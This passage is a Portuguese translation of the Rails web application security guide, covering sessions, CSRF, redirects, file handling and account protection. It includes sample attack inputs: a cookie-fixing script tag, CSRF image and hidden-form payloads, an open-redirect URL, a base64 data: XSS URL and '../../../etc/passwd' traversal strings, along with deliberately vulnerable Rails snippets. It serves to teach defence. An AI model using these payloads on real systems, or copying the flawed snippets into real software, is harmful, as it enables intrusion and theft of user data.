**DO NOT READ THIS FILE ON GITHUB, GUIDES ARE PUBLISHED ON https://guides.rubyonrails.org.**, original file md5: f769f3ad2ac56ac5949224832c8307e3
Segurança de Aplicações Rails
===========================

Este manual descreve problemas comuns de segurança em aplicações web e como evitá-los com o Rails.

Após ler este guia, você saberá:

* Todas as contramedidas _que são destacadas_.
* O conceito de sessões no Rails, o que colocar nelas e os métodos de ataque populares.
* Como apenas visitar um site pode ser um problema de segurança (com CSRF).
* No que você deve prestar atenção ao trabalhar com arquivos ou fornecer uma interface de administração.
* Como gerenciar usuários: fazer login e logout e métodos de ataque em todas as camadas.
* E os métodos de ataque por injeção mais populares.

--------------------------------------------------------------------------------

Introdução
------------

Frameworks de aplicação web são feitos para ajudar os desenvolvedores a construir aplicações web. Alguns deles também ajudam na segurança da aplicação web. Na verdade, um framework não é mais seguro do que outro: se você o usar corretamente, poderá construir aplicativos seguros com muitos frameworks. O Ruby on Rails possui alguns métodos auxiliares inteligentes, por exemplo, contra injeção de SQL, então isso dificilmente é um problema.

Em geral, não existe segurança plug-n-play. A segurança depende das pessoas que usam o framework e, às vezes, do método de desenvolvimento. E depende de todas as camadas de um ambiente de aplicação web: o armazenamento de back-end, o servidor web e a própria aplicação web (e possivelmente outras camadas ou aplicações).

No entanto, o Gartner Group estima que 75% dos ataques são na camada de aplicação web e descobriu que "de 300 sites auditados, 97% são vulneráveis a ataques". Isso ocorre porque as aplicações web são relativamente fáceis de atacar, pois são simples de entender e manipular, mesmo por pessoas leigas.

As ameaças contra aplicações web incluem sequestro de contas de usuário, bypass de controle de acesso, leitura ou modificação de dados sensíveis ou apresentação de conteúdo fraudulento. Ou um atacante pode ser capaz de instalar um programa cavalo de Troia ou software de envio de e-mails não solicitados, visando o enriquecimento financeiro ou causando danos à marca, modificando recursos da empresa. Para evitar ataques, minimizar seu impacto e remover pontos de ataque, em primeiro lugar, você precisa entender completamente os métodos de ataque para encontrar as contramedidas corretas. É isso que este guia visa.

Para desenvolver aplicações web seguras, você precisa se manter atualizado em todas as camadas e conhecer seus inimigos. Para se manter atualizado, assine listas de discussão de segurança, leia blogs de segurança e torne a atualização e verificação de segurança um hábito (verifique o capítulo [Recursos Adicionais](#recursos-adicionais)). Isso é feito manualmente porque é assim que você encontra os problemas de segurança lógica desagradáveis.

Sessões
--------

Este capítulo descreve alguns ataques específicos relacionados a sessões e medidas de segurança para proteger seus dados de sessão.

### O que são Sessões?

INFO: Sessões permitem que a aplicação mantenha o estado específico do usuário enquanto ele interage com a aplicação. Por exemplo, as sessões permitem que os usuários se autentiquem uma vez e permaneçam conectados para solicitações futuras.

A maioria das aplicações precisa acompanhar o estado dos usuários que interagem com a aplicação. Isso pode ser o conteúdo de um carrinho de compras ou o ID do usuário atualmente conectado. Esse tipo de estado específico do usuário pode ser armazenado na sessão.

O Rails fornece um objeto de sessão para cada usuário que acessa a aplicação. Se o usuário já tiver uma sessão ativa, o Rails usará a sessão existente. Caso contrário, uma nova sessão será criada.

NOTA: Leia mais sobre sessões e como usá-las no [Guia de Visão Geral do Action Controller](action_controller_overview.html#session).

### Sequestro de Sessão

AVISO: _Roubar o ID de sessão de um usuário permite que um atacante use a aplicação web em nome da vítima._

Muitas aplicações web possuem um sistema de autenticação: um usuário fornece um nome de usuário e senha, a aplicação web os verifica e armazena o ID de usuário correspondente no hash de sessão. A partir de agora, a sessão é válida. Em cada solicitação, a aplicação carregará o usuário identificado pelo ID de usuário na sessão, sem a necessidade de nova autenticação. O ID de sessão no cookie identifica a sessão.

Portanto, o cookie serve como autenticação temporária para a aplicação web. Qualquer pessoa que roube um cookie de outra pessoa pode usar a aplicação web como esse usuário - com possíveis consequências graves. Aqui estão algumas maneiras de sequestrar uma sessão e suas contramedidas:
* Farejar o cookie em uma rede insegura. Uma LAN sem fio pode ser um exemplo de tal rede. Em uma LAN sem fio não criptografada, é especialmente fácil ouvir o tráfego de todos os clientes conectados. Para o construtor de aplicativos da web, isso significa _fornecer uma conexão segura por SSL_. No Rails 3.1 e posterior, isso pode ser feito forçando sempre a conexão SSL no arquivo de configuração do aplicativo:

    ```ruby
    config.force_ssl = true
    ```

* A maioria das pessoas não limpa os cookies após usar um terminal público. Portanto, se o último usuário não saiu de um aplicativo da web, você poderá usá-lo como esse usuário. Forneça ao usuário um _botão de sair_ no aplicativo da web e _destaque-o_.

* Muitos ataques de cross-site scripting (XSS) têm como objetivo obter o cookie do usuário. Você lerá [mais sobre XSS](#cross-site-scripting-xss) posteriormente.

* Em vez de roubar um cookie desconhecido para o atacante, eles corrigem o identificador de sessão de um usuário (no cookie) conhecido por eles. Leia mais sobre essa chamada fixação de sessão posteriormente.

O principal objetivo da maioria dos atacantes é ganhar dinheiro. Os preços no mercado negro para contas de login bancário roubadas variam de 0,5% a 10% do saldo da conta, de US$ 0,5 a US$ 30 para números de cartão de crédito (de US$ 20 a US$ 60 com todos os detalhes), de US$ 0,1 a US$ 1,5 para identidades (nome, SSN e data de nascimento), de US$ 20 a US$ 50 para contas de varejistas e de US$ 6 a US$ 10 para contas de provedores de serviços em nuvem, de acordo com o [Relatório de Ameaças à Segurança na Internet da Symantec (2017)](https://docs.broadcom.com/docs/istr-22-2017-en).

### Armazenamento de Sessão

NOTA: O Rails usa `ActionDispatch::Session::CookieStore` como o armazenamento de sessão padrão.

DICA: Saiba mais sobre outros armazenamentos de sessão no [Guia de Visão Geral do Action Controller](action_controller_overview.html#session).

O `CookieStore` do Rails salva o hash da sessão em um cookie no lado do cliente. O servidor recupera o hash da sessão do cookie e elimina a necessidade de um ID de sessão. Isso aumentará significativamente a velocidade do aplicativo, mas é uma opção de armazenamento controversa e você precisa pensar nas implicações de segurança e limitações de armazenamento:

* Os cookies têm um limite de tamanho de 4 kB. Use cookies apenas para dados relevantes para a sessão.

* Os cookies são armazenados no lado do cliente. O cliente pode preservar o conteúdo do cookie mesmo para cookies expirados. O cliente pode copiar cookies para outras máquinas. Evite armazenar dados sensíveis em cookies.

* Os cookies são temporários por natureza. O servidor pode definir o tempo de expiração do cookie, mas o cliente pode excluí-lo e seu conteúdo antes disso. Persista todos os dados que têm natureza mais permanente no lado do servidor.

* Os cookies de sessão não se invalidam sozinhos e podem ser reutilizados de forma maliciosa. Pode ser uma boa ideia fazer com que seu aplicativo invalide cookies de sessão antigos usando um carimbo de data/hora armazenado.

* O Rails criptografa cookies por padrão. O cliente não pode ler ou editar o conteúdo do cookie sem quebrar a criptografia. Se você cuidar adequadamente de seus segredos, pode considerar seus cookies como geralmente seguros.

O `CookieStore` usa o jar de cookies
[criptografados](https://api.rubyonrails.org/classes/ActionDispatch/Cookies/ChainedCookieJars.html#method-i-encrypted)
para fornecer um local seguro e criptografado para armazenar dados de sessão. As sessões baseadas em cookies fornecem tanto integridade quanto confidencialidade para seus conteúdos. A chave de criptografia, assim como a chave de verificação usada para cookies
[assinados](https://api.rubyonrails.org/classes/ActionDispatch/Cookies/ChainedCookieJars.html#method-i-signed),
são derivadas do valor de configuração `secret_key_base`.

DICA: Os segredos devem ser longos e aleatórios. Use `bin/rails secret` para obter novos segredos exclusivos.

INFO: Saiba mais sobre [gerenciamento de credenciais posteriormente neste guia](security.html#custom-credentials).

Também é importante usar valores de sal diferentes para cookies criptografados e assinados. Usar o mesmo valor para diferentes configurações de sal pode resultar na mesma chave derivada sendo usada para diferentes recursos de segurança, o que pode enfraquecer a força da chave.

Em aplicativos de teste e desenvolvimento, é obtida uma `secret_key_base` derivada do nome do aplicativo. Outros ambientes devem usar uma chave aleatória presente em `config/credentials.yml.enc`, mostrada aqui em seu estado descriptografado:

```yaml
secret_key_base: 492f...
```

AVISO: Se os segredos do seu aplicativo podem ter sido expostos, considere fortemente alterá-los. Observe que a alteração de `secret_key_base` expirará as sessões atualmente ativas e exigirá que todos os usuários façam login novamente. Além dos dados da sessão, cookies criptografados, cookies assinados e arquivos do Active Storage também podem ser afetados.

### Rotacionando Configurações de Cookies Criptografados e Assinados

A rotação é ideal para alterar as configurações de cookies e garantir que os cookies antigos não sejam imediatamente inválidos. Seus usuários então têm a chance de visitar seu site, ter seu cookie lido com uma configuração antiga e tê-lo reescrito com a nova alteração. A rotação pode ser removida assim que você se sentir confortável o suficiente de que os usuários tiveram a chance de atualizar seus cookies.
É possível rotacionar as cifras e resumos usados para cookies criptografados e assinados.

Por exemplo, para alterar o resumo usado para cookies assinados de SHA1 para SHA256,
você primeiro atribuiria o novo valor de configuração:

```ruby
Rails.application.config.action_dispatch.signed_cookie_digest = "SHA256"
```

Agora adicione uma rotação para o antigo resumo SHA1 para que os cookies existentes sejam
atualizados sem problemas para o novo resumo SHA256.

```ruby
Rails.application.config.action_dispatch.cookies_rotations.tap do |cookies|
  cookies.rotate :signed, digest: "SHA1"
end
```

Então, quaisquer cookies assinados escritos serão resumidos com SHA256. Cookies antigos
que foram escritos com SHA1 ainda podem ser lidos e, se acessados, serão escritos
com o novo resumo para que sejam atualizados e não se tornem inválidos quando você remover a
rotação.

Uma vez que os usuários com cookies assinados resumidos com SHA1 não devem mais ter a chance de
ter seus cookies reescritos, remova a rotação.

Embora você possa configurar quantas rotações desejar, não é comum ter muitas
rotações ocorrendo ao mesmo tempo.

Para mais detalhes sobre rotação de chaves com mensagens criptografadas e assinadas, bem como as várias opções que o método `rotate` aceita, consulte a documentação da [API do MessageEncryptor](https://api.rubyonrails.org/classes/ActiveSupport/MessageEncryptor.html) e [API do MessageVerifier](https://api.rubyonrails.org/classes/ActiveSupport/MessageVerifier.html).

### Ataques de Repetição para Sessões do CookieStore

DICA: _Outro tipo de ataque do qual você deve estar ciente ao usar o `CookieStore` é o ataque de repetição._

Funciona assim:

* Um usuário recebe créditos, a quantidade é armazenada em uma sessão (o que é uma má ideia de qualquer maneira, mas faremos isso para fins de demonstração).
* O usuário compra algo.
* O novo valor de crédito ajustado é armazenado na sessão.
* O usuário pega o cookie do primeiro passo (que eles copiaram anteriormente) e substitui o cookie atual no navegador.
* O usuário recupera seu crédito original.

Incluir um nonce (um valor aleatório) na sessão resolve os ataques de repetição. Um nonce é válido apenas uma vez, e o servidor precisa acompanhar todos os nonces válidos. Isso se torna ainda mais complicado se você tiver vários servidores de aplicativos. Armazenar nonces em uma tabela de banco de dados derrotaria todo o propósito do CookieStore (evitar o acesso ao banco de dados).

A melhor _solução contra isso é não armazenar esse tipo de dado em uma sessão, mas no banco de dados_. Nesse caso, armazene o crédito no banco de dados e o `logged_in_user_id` na sessão.

### Fixação de Sessão

NOTA: _Além de roubar o ID da sessão de um usuário, o atacante pode fixar um ID de sessão conhecido por eles. Isso é chamado de fixação de sessão._

![Fixação de sessão](images/security/session_fixation.png)

Esse ataque se concentra em fixar um ID de sessão de um usuário conhecido pelo atacante e forçar o navegador do usuário a usar esse ID. Portanto, não é necessário para o atacante roubar o ID da sessão posteriormente. Veja como esse ataque funciona:

* O atacante cria um ID de sessão válido: eles carregam a página de login do aplicativo da web onde desejam fixar a sessão e pegam o ID da sessão no cookie da resposta (veja os números 1 e 2 na imagem).
* Eles mantêm a sessão acessando periodicamente o aplicativo da web para manter uma sessão expirada viva.
* O atacante força o navegador do usuário a usar esse ID de sessão (veja o número 3 na imagem). Como você não pode alterar um cookie de outro domínio (por causa da política de mesma origem), o atacante precisa executar um JavaScript do domínio do aplicativo da web de destino. Injetar o código JavaScript na aplicação por meio de XSS realiza esse ataque. Aqui está um exemplo: `<script>document.cookie="_session_id=16d5b78abb28e3d6206b60f22a03c8d9";</script>`. Leia mais sobre XSS e injeção posteriormente.
* O atacante atrai a vítima para a página infectada com o código JavaScript. Ao visualizar a página, o navegador da vítima alterará o ID da sessão para o ID da sessão armadilha.
* Como a nova sessão armadilha não foi usada, o aplicativo da web exigirá que o usuário faça autenticação.
* A partir de agora, a vítima e o atacante usarão o aplicativo da web com a mesma sessão: a sessão se tornou válida e a vítima não percebeu o ataque.

### Fixação de Sessão - Contramedidas

DICA: _Uma linha de código irá protegê-lo contra a fixação de sessão._

A contramedida mais eficaz é _emitir um novo identificador de sessão_ e declarar o antigo inválido após um login bem-sucedido. Dessa forma, um atacante não pode usar o identificador de sessão fixo. Isso também é uma boa contramedida contra sequestro de sessão. Veja como criar uma nova sessão no Rails:
```ruby
reset_session
```

Se você usa a popular gem [Devise](https://rubygems.org/gems/devise) para gerenciamento de usuários, ela automaticamente expirará as sessões ao fazer login e logout. Se você criar sua própria solução, lembre-se de expirar a sessão após o login (quando a sessão é criada). Isso removerá os valores da sessão, portanto _você terá que transferi-los para a nova sessão_.

Outra medida de segurança é _salvar propriedades específicas do usuário na sessão_, verificá-las toda vez que uma requisição for feita e negar o acesso se as informações não corresponderem. Essas propriedades podem ser o endereço IP remoto ou o agente do usuário (nome do navegador), embora este último seja menos específico do usuário. Ao salvar o endereço IP, é importante lembrar que existem provedores de serviços de Internet ou grandes organizações que colocam seus usuários atrás de proxies. _Esses proxies podem mudar durante o curso de uma sessão_, então esses usuários não poderão usar sua aplicação, ou apenas de forma limitada.

### Expiração de Sessão

NOTA: _Sessões que nunca expiram aumentam o tempo disponível para ataques como falsificação de solicitação entre sites (CSRF), sequestro de sessão e fixação de sessão._

Uma possibilidade é definir o tempo de expiração do cookie com o ID da sessão. No entanto, o cliente pode editar cookies armazenados no navegador, então expirar as sessões no servidor é mais seguro. Aqui está um exemplo de como _expirar sessões em uma tabela de banco de dados_. Chame `Session.sweep(20.minutes)` para expirar sessões que foram usadas há mais de 20 minutos.

```ruby
class Session < ApplicationRecord
  def self.sweep(time = 1.hour)
    where(updated_at: ...time.ago).delete_all
  end
end
```

A seção sobre fixação de sessão introduziu o problema de sessões mantidas. Um atacante que mantém uma sessão a cada cinco minutos pode manter a sessão ativa para sempre, mesmo que você esteja expirando as sessões. Uma solução simples para isso seria adicionar uma coluna `created_at` na tabela de sessões. Agora você pode excluir sessões que foram criadas há muito tempo. Use esta linha no método sweep acima:

```ruby
where(updated_at: ...time.ago).or(where(created_at: ...2.days.ago)).delete_all
```

Falsificação de Solicitação entre Sites (CSRF)
---------------------------------------------

Este método de ataque funciona incluindo código malicioso ou um link em uma página que acessa uma aplicação web na qual se acredita que o usuário esteja autenticado. Se a sessão para essa aplicação web não tiver expirado, um atacante pode executar comandos não autorizados.

![Falsificação de Solicitação entre Sites](images/security/csrf.png)

No [capítulo sobre sessões](#sessions), você aprendeu que a maioria das aplicações Rails usa sessões baseadas em cookies. Elas armazenam o ID da sessão no cookie e têm um hash de sessão no lado do servidor, ou o hash de sessão inteiro está no lado do cliente. Em ambos os casos, o navegador enviará automaticamente o cookie em cada requisição para um domínio, se encontrar um cookie para esse domínio. O ponto controverso é que, se a requisição vier de um site de um domínio diferente, ele também enviará o cookie. Vamos começar com um exemplo:

* Bob navega em um fórum e visualiza uma postagem de um hacker onde há um elemento HTML de imagem criado. O elemento faz referência a um comando na aplicação de gerenciamento de projetos de Bob, em vez de um arquivo de imagem: `<img src="http://www.webapp.com/project/1/destroy">`
* A sessão de Bob em `www.webapp.com` ainda está ativa, porque ele não fez logout alguns minutos atrás.
* Ao visualizar a postagem, o navegador encontra uma tag de imagem. Ele tenta carregar a imagem suspeita de `www.webapp.com`. Como explicado anteriormente, ele também enviará o cookie com o ID de sessão válido.
* A aplicação web em `www.webapp.com` verifica as informações do usuário no hash de sessão correspondente e destrói o projeto com o ID 1. Em seguida, retorna uma página de resultado que é um resultado inesperado para o navegador, então ele não exibirá a imagem.
* Bob não percebe o ataque - mas alguns dias depois ele descobre que o projeto número um desapareceu.

É importante notar que a imagem ou link criado não precisa necessariamente estar no domínio da aplicação web, pode estar em qualquer lugar - em um fórum, postagem de blog ou e-mail.

CSRF aparece muito raramente no CVE (Vulnerabilidades e Exposições Comuns) - menos de 0,1% em 2006 - mas realmente é um 'gigante adormecido' [Grossman]. Isso contrasta fortemente com os resultados em muitos trabalhos de contratos de segurança - _CSRF é uma questão de segurança importante_.
### Contramedidas contra CSRF

NOTA: _Primeiro, como é exigido pelo W3C, use GET e POST adequadamente. Em segundo lugar, um token de segurança em solicitações não-GET protegerá sua aplicação contra CSRF._

#### Use GET e POST adequadamente

O protocolo HTTP basicamente fornece dois tipos principais de solicitações - GET e POST (DELETE, PUT e PATCH devem ser usados como POST). O Consórcio World Wide Web (W3C) fornece uma lista de verificação para escolher entre HTTP GET ou POST:

**Use GET se:**

* A interação é mais _como uma pergunta_ (ou seja, é uma operação segura, como uma consulta, operação de leitura ou pesquisa).

**Use POST se:**

* A interação é mais _como um pedido_, ou
* A interação _altera o estado_ do recurso de uma forma que o usuário perceberia (por exemplo, uma assinatura de serviço), ou
* O usuário é _responsabilizado pelos resultados_ da interação.

Se sua aplicação web for RESTful, você pode estar acostumado com verbos HTTP adicionais, como PATCH, PUT ou DELETE. No entanto, alguns navegadores da web legados não os suportam - apenas GET e POST. O Rails usa um campo oculto `_method` para lidar com esses casos.

_As solicitações POST também podem ser enviadas automaticamente_. Neste exemplo, o link www.harmless.com é mostrado como destino na barra de status do navegador. Mas na verdade, ele criou dinamicamente um novo formulário que envia uma solicitação POST.

```html
<a href="http://www.harmless.com/" onclick="
  var f = document.createElement('form');
  f.style.display = 'none';
  this.parentNode.appendChild(f);
  f.method = 'POST';
  f.action = 'http://www.example.com/account/destroy';
  f.submit();
  return false;">Para a pesquisa inofensiva</a>
```

Ou o atacante coloca o código no manipulador de eventos onmouseover de uma imagem:

```html
<img src="http://www.harmless.com/img" width="400" height="400" onmouseover="..." />
```

Existem muitas outras possibilidades, como usar uma tag `<script>` para fazer uma solicitação entre sites para uma URL com uma resposta JSONP ou JavaScript. A resposta é um código executável que o atacante pode encontrar uma maneira de executar, possivelmente extraindo dados sensíveis. Para proteger contra esse vazamento de dados, devemos proibir tags `<script>` entre sites. No entanto, as solicitações Ajax obedecem à política de mesma origem do navegador (apenas seu próprio site pode iniciar `XmlHttpRequest`), portanto, podemos permitir com segurança que elas retornem respostas JavaScript.

NOTA: Não podemos distinguir a origem de uma tag `<script>` - se é uma tag em seu próprio site ou em algum outro site malicioso - então devemos bloquear todas as tags `<script>` indiscriminadamente, mesmo que seja na verdade um script de mesma origem seguro servido pelo seu próprio site. Nesses casos, pule explicitamente a proteção CSRF em ações que servem JavaScript destinado a uma tag `<script>`.

#### Token de segurança obrigatório

Para proteger contra todas as outras solicitações falsificadas, introduzimos um _token de segurança obrigatório_ que nosso site conhece, mas outros sites não conhecem. Incluímos o token de segurança em solicitações e verificamos no servidor. Isso é feito automaticamente quando [`config.action_controller.default_protect_from_forgery`][] é definido como `true`, que é o padrão para aplicativos Rails recém-criados. Você também pode fazer isso manualmente adicionando o seguinte ao seu controlador de aplicativo:

```ruby
protect_from_forgery with: :exception
```

Isso incluirá um token de segurança em todos os formulários gerados pelo Rails. Se o token de segurança não corresponder ao esperado, uma exceção será lançada.

Ao enviar formulários com [Turbo](https://turbo.hotwired.dev/), o token de segurança também é necessário. O Turbo procura o token nas meta tags `csrf` do layout de sua aplicação e o adiciona à solicitação no cabeçalho da solicitação `X-CSRF-Token`. Essas meta tags são criadas com o método auxiliar [`csrf_meta_tags`][]:

```erb
<head>
  <%= csrf_meta_tags %>
</head>
```

que resulta em:

```html
<head>
  <meta name="csrf-param" content="authenticity_token" />
  <meta name="csrf-token" content="THE-TOKEN" />
</head>
```

Ao fazer suas próprias solicitações não-GET a partir do JavaScript, o token de segurança também é necessário. [Rails Request.JS](https://github.com/rails/request.js) é uma biblioteca JavaScript que encapsula a lógica de adicionar os cabeçalhos de solicitação necessários.

Ao usar outra biblioteca para fazer chamadas Ajax, é necessário adicionar o token de segurança como um cabeçalho padrão. Para obter o token da meta tag, você pode fazer algo como:

```javascript
document.head.querySelector("meta[name=csrf-token]")?.content
```

#### Limpeza de cookies persistentes

É comum usar cookies persistentes para armazenar informações do usuário, com `cookies.permanent`, por exemplo. Nesse caso, os cookies não serão limpos e a proteção CSRF padrão não será eficaz. Se você estiver usando um armazenamento de cookies diferente da sessão para essas informações, deverá lidar com o que fazer com elas:
```ruby
rescue_from ActionController::InvalidAuthenticityToken do |exception|
  sign_out_user # Método de exemplo que irá destruir os cookies do usuário
end
```

O método acima pode ser colocado no `ApplicationController` e será chamado quando um token CSRF não estiver presente ou estiver incorreto em uma requisição não-GET.

Observe que _vulnerabilidades de cross-site scripting (XSS) ignoram todas as proteções CSRF_. XSS dá ao atacante acesso a todos os elementos em uma página, então eles podem ler o token de segurança CSRF de um formulário ou enviar o formulário diretamente. Leia [mais sobre XSS](#cross-site-scripting-xss) posteriormente.


Redirecionamento e Arquivos
---------------------------

Outra classe de vulnerabilidades de segurança envolve o uso de redirecionamento e arquivos em aplicações web.

### Redirecionamento

AVISO: _Redirecionamento em uma aplicação web é uma ferramenta subestimada de crackers: Não apenas o atacante pode encaminhar o usuário para um site falso, mas também pode criar um ataque autocontido._

Sempre que o usuário puder passar (partes do) URL para redirecionamento, há uma possibilidade de vulnerabilidade. O ataque mais óbvio seria redirecionar os usuários para um aplicativo web falso que parece e se comporta exatamente como o original. Esse chamado ataque de phishing funciona enviando um link não suspeito por e-mail para os usuários, injetando o link por XSS na aplicação web ou colocando o link em um site externo. É não suspeito, porque o link começa com a URL da aplicação web e a URL do site malicioso está oculta no parâmetro de redirecionamento: http://www.exemplo.com/site/redirecionar?para=www.atacante.com. Aqui está um exemplo de uma ação legada:

```ruby
def legado
  redirect_to(params.update(action: 'principal'))
end
```

Isso redirecionará o usuário para a ação principal se eles tentarem acessar uma ação legada. A intenção era preservar os parâmetros de URL para a ação legada e passá-los para a ação principal. No entanto, pode ser explorado pelo atacante se eles incluírem uma chave de host na URL:

```
http://www.exemplo.com/site/legado?param1=xy&param2=23&host=www.atacante.com
```

Se estiver no final da URL, dificilmente será notado e redirecionará o usuário para o host `atacante.com`. Como regra geral, passar a entrada do usuário diretamente para `redirect_to` é considerado perigoso. Uma contramedida simples seria _incluir apenas os parâmetros esperados em uma ação legada_ (novamente uma abordagem de lista permitida, em oposição à remoção de parâmetros inesperados). _E se você redirecionar para uma URL, verifique-a com uma lista permitida ou uma expressão regular_.

#### XSS autocontido

Outro ataque de redirecionamento e XSS autocontido funciona no Firefox e Opera pelo uso do protocolo de dados. Esse protocolo exibe seu conteúdo diretamente no navegador e pode ser qualquer coisa, desde HTML ou JavaScript até imagens inteiras:

`data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K`

Este exemplo é um JavaScript codificado em Base64 que exibe uma caixa de mensagem simples. Em uma URL de redirecionamento, um atacante poderia redirecionar para esta URL com o código malicioso nela. Como contramedida, _não permita que o usuário forneça (partes do) URL para serem redirecionados_.

### Upload de Arquivos

NOTA: _Certifique-se de que o upload de arquivos não sobrescreva arquivos importantes e processe arquivos de mídia de forma assíncrona._

Muitas aplicações web permitem que os usuários façam upload de arquivos. _Nomes de arquivos, que o usuário pode escolher (em parte), devem sempre ser filtrados_, pois um atacante pode usar um nome de arquivo malicioso para sobrescrever qualquer arquivo no servidor. Se você armazena uploads de arquivos em /var/www/uploads e o usuário insere um nome de arquivo como "../../../etc/passwd", ele pode sobrescrever um arquivo importante. Claro, o interpretador Ruby precisaria das permissões apropriadas para fazer isso - mais um motivo para executar servidores web, servidores de banco de dados e outros programas como um usuário Unix com menos privilégios.

Ao filtrar nomes de arquivos fornecidos pelo usuário, _não tente remover partes maliciosas_. Pense em uma situação em que a aplicação web remove todos os "../" em um nome de arquivo e um atacante usa uma string como "....//" - o resultado será "../". É melhor usar uma abordagem de lista permitida, que _verifica a validade de um nome de arquivo com um conjunto de caracteres aceitos_. Isso é oposto a uma abordagem de lista restrita que tenta remover caracteres não permitidos. Caso não seja um nome de arquivo válido, rejeite-o (ou substitua caracteres não aceitos), mas não os remova. Aqui está o sanitizador de nomes de arquivo do [plugin attachment_fu](https://github.com/technoweenie/attachment_fu/tree/master):

```ruby
def sanitize_filename(filename)
  filename.strip.tap do |name|
    # NOTA: File.basename não funciona corretamente com caminhos do Windows no Unix
    # obtenha apenas o nome do arquivo, não o caminho inteiro
    name.sub!(/\A.*(\\|\/)/, '')
    # Finalmente, substitua todos os caracteres não alfanuméricos, sublinhado
    # ou pontos por sublinhado
    name.gsub!(/[^\w.-]/, '_')
  end
end
```

Uma desvantagem significativa do processamento síncrono de uploads de arquivos (como o plugin `attachment_fu` pode fazer com imagens) é sua _vulnerabilidade a ataques de negação de serviço_. Um atacante pode iniciar sincronamente uploads de arquivos de imagem a partir de muitos computadores, aumentando a carga do servidor e eventualmente fazendo com que ele trave ou pare de funcionar.

A solução para isso é _processar arquivos de mídia de forma assíncrona_: Salve o arquivo de mídia e agende uma solicitação de processamento no banco de dados. Um segundo processo lidará com o processamento do arquivo em segundo plano.

### Código Executável em Uploads de Arquivos

AVISO: _Código fonte em arquivos enviados pode ser executado quando colocados em diretórios específicos. Não coloque uploads de arquivos no diretório /public do Rails se ele for o diretório raiz do Apache._

O popular servidor web Apache possui uma opção chamada DocumentRoot. Este é o diretório raiz do site, tudo neste diretório será servido pelo servidor web. Se houver arquivos com uma determinada extensão de nome de arquivo, o código neles será executado quando solicitado (podem ser necessárias algumas opções para serem definidas). Exemplos disso são arquivos PHP e CGI. Agora, pense em uma situação em que um atacante faz upload de um arquivo "file.cgi" com código nele, que será executado quando alguém baixar o arquivo.

_Se o DocumentRoot do seu Apache apontar para o diretório /public do Rails, não coloque uploads de arquivos nele_, armazene os arquivos pelo menos um nível acima.

### Downloads de Arquivos

NOTA: _Certifique-se de que os usuários não possam baixar arquivos arbitrários._

Assim como você precisa filtrar os nomes de arquivos para uploads, você também precisa fazer isso para downloads. O método `send_file()` envia arquivos do servidor para o cliente. Se você usar um nome de arquivo que o usuário digitou sem filtragem, qualquer arquivo pode ser baixado:

```ruby
send_file('/var/www/uploads/' + params[:filename])
```

Basta passar um nome de arquivo como "../../../etc/passwd" para baixar as informações de login do servidor. Uma solução simples contra isso é _verificar se o arquivo solicitado está no diretório esperado_:

```ruby
basename = File.expand_path('../../files', __dir__)
filename = File.expand_path(File.join(basename, @file.public_filename))
raise if basename != File.expand_path(File.dirname(filename))
send_file filename, disposition: 'inline'
```

Outra abordagem (adicional) é armazenar os nomes dos arquivos no banco de dados e nomear os arquivos no disco com base nos IDs no banco de dados. Essa também é uma boa abordagem para evitar que possíveis códigos em um arquivo enviado sejam executados. O plugin `attachment_fu` faz isso de maneira semelhante.

Gerenciamento de Usuários
-------------------------

NOTA: _Quase toda aplicação web precisa lidar com autorização e autenticação. Em vez de criar o seu próprio, é aconselhável usar plugins comuns. Mas mantenha-os atualizados também. Algumas precauções adicionais podem tornar sua aplicação ainda mais segura._

Existem vários plugins de autenticação disponíveis para o Rails. Bons plugins, como o popular [devise](https://github.com/heartcombo/devise) e [authlogic](https://github.com/binarylogic/authlogic), armazenam apenas senhas criptografadas, não senhas em texto simples. Desde o Rails 3.1, você também pode usar o método embutido [`has_secure_password`](https://api.rubyonrails.org/classes/ActiveModel/SecurePassword/ClassMethods.html#method-i-has_secure_password), que suporta o hash seguro de senhas, mecanismos de confirmação e recuperação.

### Ataques de Força Bruta em Contas

NOTA: _Ataques de força bruta em contas são ataques de tentativa e erro nas credenciais de login. Defenda-se com mensagens de erro mais genéricas e possivelmente exija a entrada de um CAPTCHA._

Uma lista de nomes de usuário para sua aplicação web pode ser usada indevidamente para forçar a senha correspondente, porque a maioria das pessoas não usa senhas sofisticadas. A maioria das senhas é uma combinação de palavras do dicionário e possivelmente números. Portanto, armado com uma lista de nomes de usuário e um dicionário, um programa automático pode encontrar a senha correta em questão de minutos.

Por causa disso, a maioria das aplicações web exibirá uma mensagem de erro genérica "nome de usuário ou senha incorretos", se um deles estiver incorreto. Se disser "o nome de usuário que você digitou não foi encontrado", um atacante poderia compilar automaticamente uma lista de nomes de usuário.

No entanto, o que a maioria dos designers de aplicações web negligencia são as páginas de esqueci minha senha. Essas páginas muitas vezes admitem que o nome de usuário ou endereço de e-mail digitado foi (não) encontrado. Isso permite que um atacante compile uma lista de nomes de usuário e force as contas.

Para mitigar tais ataques, _exiba uma mensagem de erro genérica também nas páginas de esqueci minha senha_. Além disso, você pode _exigir a entrada de um CAPTCHA após um número de tentativas de login falhadas de um determinado endereço IP_. Observe, no entanto, que isso não é uma solução infalível contra programas automáticos, porque esses programas podem alterar seu endereço IP exatamente com a mesma frequência. No entanto, isso aumenta a barreira de um ataque.
### Sequestro de Conta

Muitos aplicativos da web facilitam o sequestro de contas de usuários. Por que não ser diferente e tornar isso mais difícil?

#### Senhas

Pense em uma situação em que um invasor tenha roubado o cookie de sessão de um usuário e, assim, possa co-utilizar o aplicativo. Se for fácil alterar a senha, o invasor poderá sequestrar a conta com alguns cliques. Ou se o formulário de alteração de senha for vulnerável a CSRF, o invasor poderá alterar a senha da vítima atraindo-a para uma página da web onde há uma tag IMG criada que faz o CSRF. Como medida de segurança, _torne os formulários de alteração de senha seguros contra CSRF_, é claro. E _exija que o usuário digite a senha antiga ao alterá-la_.

#### E-mail

No entanto, o invasor também pode assumir o controle da conta alterando o endereço de e-mail. Depois de alterá-lo, ele irá para a página de esqueci minha senha e a senha (possivelmente nova) será enviada para o endereço de e-mail do invasor. Como medida de segurança, _exija que o usuário digite a senha ao alterar o endereço de e-mail também_.

#### Outros

